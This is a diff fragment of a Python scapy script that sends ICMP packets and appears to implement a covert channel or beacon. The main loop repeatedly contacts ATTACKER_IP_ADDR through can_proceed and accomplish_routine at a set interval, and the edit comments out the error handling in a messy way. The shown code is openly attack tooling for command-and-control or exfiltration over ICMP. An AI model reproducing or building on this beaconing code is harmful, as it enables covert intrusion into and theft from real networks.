@@ -18,7 +18,7 @@ DEFAULT_PAYLOAD = b''
 def send_ping(ip_addr, id, seq_number, payload, timeout, nb_responses=1):
     request = scapy.IP(dst=ip_addr) / scapy.ICMP(id=id, seq=seq_number) / payload
     scapy.send(request)
-    return receive_response_packet(request, timeout, nb_responses)
+    return receive_response_packet(timeout, nb_responses)
 
 
 def send_data(ip_addr, id, data):
@@ -138,13 +138,13 @@ def forge_random_command():
 # Press the green button in the gutter to run the script.
 if __name__ == '__main__':
     while True:
-        try:
-            if can_proceed(ATTACKER_IP_ADDR):
-                accomplish_routine(ATTACKER_IP_ADDR)
-        except Exception as err:
-            print(f"Unexpected {err=}, {type(err)=}")
-        else:
-            print("Nothing went wrong!")
-        finally:
-            print(f"See you in {FREQUENCY} min(s)")
-            time.sleep(FREQUENCY)
+        #try:
+        if can_proceed(ATTACKER_IP_ADDR):
+            accomplish_routine(ATTACKER_IP_ADDR)
+                #except Exception as err:
+            #print(f"Unexpected {err=}, {type(err)=}")
+            #else:
+        #    print("Nothing went wrong!")
+        #finally:
+        #    print(f"See you in {FREQUENCY} min(s)")
+        time.sleep(FREQUENCY)
